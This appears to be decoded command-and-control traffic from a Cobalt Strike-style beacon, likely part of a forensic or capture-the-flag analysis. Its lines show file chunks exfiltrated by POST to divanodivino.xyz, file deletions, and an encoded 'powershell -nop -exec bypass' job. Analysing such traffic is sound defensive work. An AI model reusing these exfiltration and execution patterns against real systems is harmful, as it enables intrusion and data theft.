+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 45
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: f2382ed709782f6ca8ab3cc41041b31f
+
+Packet number: 5717
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 46
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 1a7f946e27994e2f24669b32bdfa139c
+
+Packet number: 5768
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 47
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: c96b6c5cf6bbd832a64ec59d14497c0a
+
+Packet number: 5820
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 48
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 57a8d205bf4d2f01baaae9da76acc6ec
+
+Packet number: 5836
+HTTP response (for request 5833 GET)
+Length raw data: 8841
+HMAC signature invalid
+
+Packet number: 5885
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 49
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: b7e12bba36f4d777a67106a8e30e00d8
+
+Packet number: 5935
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 50
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 8d7cdcded447a920a049e742e1be4cbc
+
+Packet number: 5989
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 51
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 2c002895fb615cfe32a9c68ea3551cf2
+
+Packet number: 6038
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 52
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 3bc9213f3da76657ac551d218ae799c0
+
+Packet number: 6090
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 53
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 7327ec286b41c41351c2583ba114030a
+
+Packet number: 6139
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 54
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 9a2084d354e1938b81c79c3d0f3fd4af
+
+Packet number: 6188
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 55
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 07b79ea39748f9f888c2052356c35a04
+
+Packet number: 6206
+HTTP response (for request 6201 GET)
+Length raw data: 5391
+HMAC signature invalid
+
+Packet number: 6255
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 56
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: c7f5ebda539422e54e4e95a95af8d9d7
+
+Packet number: 6304
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 57
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: d6643c79b640c07ff2626cffa3c3c264
+
+Packet number: 6475
+HTTP response (for request 6317 GET)
+Length raw data: 210554
+HMAC signature invalid
+
+Packet number: 6525
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 58
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 1ba623e78bf6d07b74e2e3999702df6f
+
+Packet number: 6578
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 59
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: efc4b6f144f98f85863a47c60708e535
+
+Packet number: 6625
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 60
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 794193677394949a9545d315a9503903
+
+Packet number: 6673
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 61
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 82f5487d722be0a10ca506a6c9e767d0
+
+Packet number: 6724
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 62
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: eea896a85b22a9ba8d78de0387d93751
+
+Packet number: 6772
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 63
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 30c5eb4bec0ab61ea79c4dc8408700aa
+
+Packet number: 6821
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 64
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 21b6db4be22a9a58d6bb3ff0d160e38b
+
+Packet number: 6838
+HTTP response (for request 6835 GET)
+Length raw data: 4868
+HMAC signature invalid
+
+Packet number: 6882
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 65
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: a7a3dbd7dca32fe67e063d7cd1925349
+
+Packet number: 6933
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 66
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 7bcf3be82f38fa0f4e22a8d14f959091
+
+Packet number: 6984
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 67
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 80e062d406e77c0f68978f37069e9478
+
+Packet number: 7032
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 68
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: ff6402b37c1c7735704a0fe14300eb35
+
+Packet number: 7085
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 69
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 76a5ee10048eab9de9d15d2f3f7e765a
+
+Packet number: 7133
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 70
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: cc26c3e5868033d4337ce3db7c409536
+
+Packet number: 7185
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 71
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 368d768b1d390b7031eaeb0f126bd727
+
+Packet number: 7272
+HTTP response (for request 7197 GET)
+Length raw data: 103069
+HMAC signature invalid
+
+Packet number: 7321
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 72
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 97b1118ac23ac4f049024f7b108ed496
+
+Packet number: 7369
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 73
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: cc5ad3192c7189f060b91bc86b227003
+
+Packet number: 7419
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 74
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: d8a074aa7cd02e3c49f5702f4b7fa789
+
+Packet number: 7468
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 75
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 7cffae002b0013a92a1e22455c5f9b66
+
+Packet number: 7522
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 76
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: eb52a7429bb017f391b8582e9aeba44c
+
+Packet number: 7578
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 77
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 53fae1b8924980775714403bc752bdd7
+
+Packet number: 7595
+HTTP response (for request 7591 GET)
+Length raw data: 9563
+HMAC signature invalid
+
+Packet number: 7654
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 78
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: a5dd521dd540b71f256717a525b7e95c
+
+Packet number: 7713
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 79
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 6911048e0b987da1553b1ac49b82ba72
+
+Packet number: 7770
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 80
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 13a45cffe9756d88de44f0ebe18cefd8
+
+Packet number: 7823
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 81
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 7e53edd04470a6d7d9d9af19780ae566
+
+Packet number: 7841
+HTTP response (for request 7839 GET)
+Length raw data: 564
+HMAC signature invalid
+
+Packet number: 7892
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 82
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 31e21db4ec5485cff88dc497f27ffa35
+
+Packet number: 7943
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 83
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 34fede6d2fa5dcf19c1cb7f217629033
+
+Packet number: 8001
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 84
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 19efa91b6f27f4bcaff87b3185daa85d
+
+Packet number: 8054
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 85
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 84f2e9cf0c748cd43b52898fe5baa60f
+
+Packet number: 8108
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 86
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: dc64c4a04d312cac19b6330650f3638c
+
+Packet number: 8163
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 87
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 6a0d0ce74df157bb09f7e8a9b0192572
+
+Packet number: 8184
+HTTP response (for request 8181 GET)
+Length raw data: 5918
+HMAC signature invalid
+
+Packet number: 8230
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 88
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 64ef02b05ef782af55f34397aa84e9d1
+
+Packet number: 8282
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 89
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: a8cca2c1eff1724d0b5ca57fae362081
+
+Packet number: 8334
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 90
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: a829e3ea787da3947c39ab325aa8c3e4
+
+Packet number: 8385
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 91
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 369aaaba4e8c61d1e56d9f593942c80f
+
+Packet number: 8434
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 92
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 5c9d4e64752ddc27f2b5395c3afad015
+
+Packet number: 8482
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 93
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 8ecd348d4cdd9c9d3825de980fc24248
+
+Packet number: 8533
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 94
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 798159b5b1819040e142102fcc65318b
+
+Packet number: 8579
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 95
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: 479d8cc1f95691ab83d4aed0bab86ade
+
+Packet number: 8635
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 96
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: d89325c33ae763edfc4cfa841b3d51e7
+
+Packet number: 8687
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 524340
+Counter: 97
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 524288
+ MD5: dcb195b412cc4291ca74dc8bcd83ca0e
+
+Packet number: 8715
+HTTP response (for request 8701 GET)
+Length raw data: 92787
+HMAC signature invalid
+
+Packet number: 8762
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 375512
+Counter: 98
+Callback: 8 CALLBACK_FILE_WRITE
+ Length: 375407
+ MD5: 23677358ecf22d102fae608093e0dba7
+Extra packet data: b'\x97'
+
+Counter: 99
+Callback: 9 CALLBACK_FILE_CLOSE
+b'\x00\x00\x00\x00'
+
+Packet number: 9104
+HTTP response (for request 8869 GET)
+Length raw data: 314225
+HMAC signature invalid
+
+Packet number: 9138
+HTTP response (for request 9135 GET)
+Length raw data: 48
+Timestamp: 1725110510 20240831-132150
+Data size: 12
+Command: 56 COMMAND_RM
+ Arguments length: 4
+ b'a.7z'
+ MD5: ac3042d30409097d1444b9b35892304f
+
+Packet number: 9160
+HTTP response (for request 9157 GET)
+Length raw data: 8841
+HMAC signature invalid
+
+Packet number: 9191
+HTTP response (for request 9188 GET)
+Length raw data: 48
+Timestamp: 1725110514 20240831-132154
+Data size: 19
+Command: 56 COMMAND_RM
+ Arguments length: 11
+ b'Diavola.exe'
+ MD5: 98ff4224baa9ed7b4bcf3c4af428526e
+
+Packet number: 9248
+HTTP response (for request 9242 GET)
+Length raw data: 5391
+HMAC signature invalid
+
+Packet number: 9259
+HTTP response (for request 9256 GET)
+Length raw data: 48
+Timestamp: 1725110519 20240831-132159
+Data size: 20
+Command: 56 COMMAND_RM
+ Arguments length: 12
+ b'PizzaBox.exe'
+ MD5: 22efa62ec2c671c41d544d378a13abc6
+
+Packet number: 9488
+HTTP response (for request 9331 GET)
+Length raw data: 210554
+HMAC signature invalid
+
+Packet number: 9551
+HTTP response (for request 9547 GET)
+Length raw data: 1888
+Timestamp: 1725110531 20240831-132211
+Data size: 1859
+Command: 78 COMMAND_EXECUTE_JOB
+ Command: b''
+ Arguments: b'powershell -nop -exec bypass -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBtAEUAMQBaAGoAVgBsAE0AagBBADEATgBUAGMAeQBOAG0ATQB5AE0ARABZADMATgB6AFUAMwBNAGoAWQAxAE4AegBJAHkATQBUAEkAdwBOAFcAVQAxAFoAagBKAGgATQBHAFEAdwBZAFQAQgBrAE0ARwBFADEATgBqAGMAegBNAGoAQQAyAFkAegBZAHkATgBqAGcAeQBNAEQAYwB4AE4AagBJADIATQBUAEkAMwBOAGoAYwB5AE0ARABZAHoATgBtAFUAMgBZAHoASQB3AE4AagBjADMATgBUAGMAeQBNAGoAQQAyAE4AVABaAGwATgBqAEUAMgBOAGoAWQB5AE4AMgBFAHkAWQB6AEkAdwBOAG0ARQAzAE0AagBJAHcATgBtAEUAMwBOAGoAYwA1AE4AegBrAHkATQBEAFkAMQBOAHoASQAzAE8AVABjAHkATgBtAFUAMgBOAGoAYwB5AE0AagBBADIATgB6AGMAMQBOAHoASQB5AE0ARABjAHkATgBtAEkAMwBNAHoAYwAyAE4AegBrADIATgB6AFkAMQBOAG0AVQAyAE4AegBjAHkATgB6AEUAeQBNAEQATQAzAE4AbQBRAHkATQBEAGMAegBOAHoAWQAzAE8AVABjAHkATQBqAEEAMgBNAGoAWQB4AE0AagBBADIATQBqAFkANABOAGoAVQB5AE0ARABjADUATgB6AEkAMgBaAFQAYwA0AE4AagBZADMATgBqAFkAMwBOAHoASQB5AE0ARABZAHkATgBqAEUAeQBNAEQATQB5AE0AegBBAHoATQBqAE0AMABNAG0AUQB6AE0ARABNADUATQBtAFEAegBNAEQATQB5AE4ARABjAHoATQBUAE0AMQBNAHoAQQB6AE0ARABSAGsATQBtAFUAdwBaAEQAQgBoAE0ARwBRAHcAWQBUAFEANQBOAHoAWQAyAE4AagBjADIATgBqAGMAeQBNAEQAWQB5AE4AagBnADIATgBUAEkAdwBOAGoAWQAzAE4AagBZADMATgB6AEkAegBZAFQAQgBrAE0ARwBFADMATgBUAFkAMwBOAGoAYwAyAE0AegBZADIATQAyAEUAeQBaAGoASgBtAE4AbQBFADIAWgBUAGMANQBOAHoAawB5AFoAVABZAHkATgB6AE0AeQBaAFQAWQAyAE4AegBVADMATQBqAGMAeQBOAGoATQAyAE4AagBKAGwATgB6AEUAMwBOAGoAWQA1AE4AbQBVADIATQBUAFkAeQBOAHoARQAzAE4AagBZADUATgB6AFkAMgBNAFQAWQB5AE0AbQBVADIAWQBqAFoAagBOAG0AUQB5AFoAagBjADQATgBqAEkAMgBPAEQAWQA1AE4AagBJADIATgBqAFkAMwBOAGoASQAyAE0AVABkAGgATgBtAFUAMwBPAEQAYwA0AE4AbQBVADIATgBUAFoAbABNAEcAUQB3AFkAVABCAGsATQBHAEUAMQBaAFQAVgBtAE0AbQBFAHkATQBEAFEAeABOAGoASQAyAE4AegBjADEATgB6AFkAMgBNAFQAYwAwAE0AagBBADIATQB6AGMAeQBOAGoAVQAyAE4AagBZAHkATgBqAEUAMgBaAFQAYwA1AE0AbQBNAHkATQBEAGMAMwBOAGoAZwAyAE4AagBZADMATQBqAEEAMgBaAGoAWQA0AE4AagBZADMATgBqAFkAeABOAHoASQAyAE4AagBZADIATQBqAEEAeQBZAFQAVgBtAE4AVwBVAD0AIgA='
+ Integer: 1
+
+Packet number: 9559
+HTTP request POST
+http://divanodivino.xyz/submit.php?id=1671185270
+Length raw data: 3988
+Counter: 100
+Callback: 30 CALLBACK_OUTPUT_OEM
+#< CLIXML
+MmE1ZjVlMjA1NTcyNmMyMDY3NzU3MjY1NzIyMTIwNWU1ZjJhMGQwYTBkMGE1NjczMjA2YzYyNjgyMDcxNjI2MTI3NjcyMDYzNmU2YzIwNjc3NTcyMjA2NTZlNjE2NjYyN2EyYzIwNmE3MjIwNmE3Njc5NzkyMDY1NzI3OTcyNmU2NjcyMjA2Nzc1NzIyMDcyNmI3Mzc2Nzk2NzY1NmU2NzcyNzEyMDM3NmQyMDczNzY3OTcyMjA2MjYxMjA2MjY4NjUyMDc5NzI2ZTc4NjY3NjY3NzIyMDYyNjEyMDMyMzAzMjM0MmQzMDM5MmQzMDMyNDczMTM1MzAzMDRkMmUwZDBhMGQwYTQ5NzY2Njc2NjcyMDYyNjg2NTIwNjY3NjY3NzIzYTBkMGE3NTY3Njc2MzY2M2EyZjJmNmE2ZTc5NzkyZTYyNzMyZTY2NzU3MjcyNjM2NjJlNzE3NjY5NmU2MTYyNzE3NjY5NzY2MTYyMmU2YjZjNmQyZjc4NjI2ODY5NjI2NjY3NjI2MTdhNmU3ODc4NmU2NTZlMGQwYTBkMGE1ZTVmMmEyMDQxNjI2Nzc1NzY2MTc0MjA2MzcyNjU2NjYyNjE2ZTc5MmMyMDc3Njg2NjY3MjA2ZjY4NjY3NjYxNzI2NjY2MjAyYTVmNWU=
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="information" RefId="1"><TN RefId="1"><T>System.Management.Automation.InformationRecord</T><T>System.Object</T></TN><ToString>MmE1ZjVlMjA1NTcyNmMyMDY3NzU3MjY1NzIyMTIwNWU1ZjJhMGQwYTBkMGE1NjczMjA2YzYyNjgyMDcxNjI2MTI3NjcyMDYzNmU2YzIwNjc3NTcyMjA2NTZlNjE2NjYyN2EyYzIwNmE3MjIwNmE3Njc5NzkyMDY1NzI3OTcyNmU2NjcyMjA2Nzc1NzIyMDcyNmI3Mzc2Nzk2NzY1NmU2NzcyNzEyMDM3NmQyMDczNzY3OTcyMjA2MjYxMjA2MjY4NjUyMDc5NzI2ZTc4NjY3NjY3NzIyMDYyNjEyMDMyMzAzMjM0MmQzMDM5MmQzMDMyNDczMTM1MzAzMDRkMmUwZDBhMGQwYTQ5NzY2Njc2NjcyMDYyNjg2NTIwNjY3NjY3NzIzYTBkMGE3NTY3Njc2MzY2M2EyZjJmNmE2ZTc5NzkyZTYyNzMyZTY2NzU3MjcyNjM2NjJlNzE3NjY5NmU2MTYyNzE3NjY5NzY2MTYyMmU2YjZjNmQyZjc4NjI2ODY5NjI2NjY3NjI2MTdhNmU3ODc4NmU2NTZlMGQwYTBkMGE1ZTVmMmEyMDQxNjI2Nzc1NzY2MTc0MjA2MzcyNjU2NjYyNjE2ZTc5MmMyMDc3Njg2NjY3MjA2ZjY4NjY3NjYxNzI2NjY2MjAyYTVmNWU=</ToString><Props><Obj N="MessageData" RefId="2"><TN RefId="2"><T>System.Management.Automation.HostInformationMessage</T><T>System.Object</T></TN><ToString>MmE1ZjVlMjA1NTcyNmMyMDY3NzU3MjY1NzIyMTIwNWU1ZjJhMGQwYTBkMGE1NjczMjA2YzYyNjgyMDcxNjI2MTI3NjcyMDYzNmU2YzIwNjc3NTcyMjA2NTZlNjE2NjYyN2EyYzIwNmE3MjIwNmE3Njc5NzkyMDY1NzI3OTcyNmU2NjcyMjA2Nzc1NzIyMDcyNmI3Mzc2Nzk2NzY1NmU2NzcyNzEyMDM3NmQyMDczNzY3OTcyMjA2MjYxMjA2MjY4NjUyMDc5NzI2ZTc4NjY3NjY3NzIyMDYyNjEyMDMyMzAzMjM0MmQzMDM5MmQzMDMyNDczMTM1MzAzMDRkMmUwZDBhMGQwYTQ5NzY2Njc2NjcyMDYyNjg2NTIwNjY3NjY3NzIzYTBkMGE3NTY3Njc2MzY2M2EyZjJmNmE2ZTc5NzkyZTYyNzMyZTY2NzU3MjcyNjM2NjJlNzE3NjY5NmU2MTYyNzE3NjY5NzY2MTYyMmU2YjZjNmQyZjc4NjI2ODY5NjI2NjY3NjI2MTdhNmU3ODc4NmU2NTZlMGQwYTBkMGE1ZTVmMmEyMDQxNjI2Nzc1NzY2MTc0MjA2MzcyNjU2NjYyNjE2ZTc5MmMyMDc3Njg2NjY3MjA2ZjY4NjY3NjYxNzI2NjY2MjAyYTVmNWU=</ToString><Props><S N="Message">MmE1ZjVlMjA1NTcyNmMyMDY3NzU3MjY1NzIyMTIwNWU1ZjJhMGQwYTBkMGE1NjczMjA2YzYyNjgyMDcxNjI2MTI3NjcyMDYzNmU2YzIwNjc3NTcyMjA2NTZlNjE2NjYyN2EyYzIwNmE3MjIwNmE3Njc5NzkyMDY1NzI3OTcyNmU2NjcyMjA2Nzc1NzIyMDcyNmI3Mzc2Nzk2NzY1NmU2NzcyNzEyMDM3NmQyMDczNzY3OTcyMjA2MjYxMjA2MjY4NjUyMDc5NzI2ZTc4NjY3NjY3NzIyMDYyNjEyMDMyMzAzMjM0MmQzMDM5MmQzMDMyNDczMTM1MzAzMDRkMmUwZDBhMGQwYTQ5NzY2Njc2NjcyMDYyNjg2NTIwNjY3NjY3NzIzYTBkMGE3NTY3Njc2MzY2M2EyZjJmNmE2ZTc5NzkyZTYyNzMyZTY2NzU3MjcyNjM2NjJlNzE3NjY5NmU2MTYyNzE3NjY5NzY2MTYyMmU2YjZjNmQyZjc4NjI2ODY5NjI2NjY3NjI2MTdhNmU3ODc4NmU2NTZlMGQwYTBkMGE1ZTVmMmEyMDQxNjI2Nzc1NzY2MTc0MjA2MzcyNjU2NjYyNjE2ZTc5MmMyMDc3Njg2NjY3MjA2ZjY4NjY3NjYxNzI2NjY2MjAyYTVmNWU=</S><B N="NoNewLine">false</B><S N="ForegroundColor">Gray</S><S N="BackgroundColor">Black</S></Props></Obj><S N="Source">Write-Host</S><DT N="TimeGenerated">2024-08-31T16:22:12.1287316+03:00</DT><Obj N="Tags" RefId="3"><TN RefId="3"><T>System.Collections.Generic.List`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]</T><T>System.Object</T></TN><LST><S>PSHOST</S></LST></Obj><S N="User">ARMAND-PC\armand</S><S N="Computer">ARMAND-PC</S><U32 N="ProcessId">6740</U32><U32 N="NativeThreadId">5056</U32><U32 N="ManagedThreadId">7</U32></Props></Obj></Objs>
+
+Packet number: 9586
+HTTP response (for request 9583 GET)
+Length raw data: 4868
+HMAC signature invalid
+
+Packet number: 9724
+HTTP response (for request 9648 GET)
+Length raw data: 103069
+HMAC signature invalid
+
+Packet number: 9815
+HTTP response (for request 9811 GET)
+Length raw data: 9563
+HMAC signature invalid
+
+Commands summary:
+ 4 COMMAND_SLEEP: 1
+ 5 COMMAND_CD: 1
+ 10 COMMAND_UPLOAD: 1
+ 11 COMMAND_DOWNLOAD: 1
+ 53 COMMAND_LS: 3
+ 56 COMMAND_RM: 3
+ 78 COMMAND_EXECUTE_JOB: 9
+
+Callbacks summary:
+ 2 CALLBACK_FILE: 1
+ 8 CALLBACK_FILE_WRITE: 85
+ 9 CALLBACK_FILE_CLOSE: 1
+ 22 CALLBACK_PENDING: 3
+ 30 CALLBACK_OUTPUT_OEM: 9
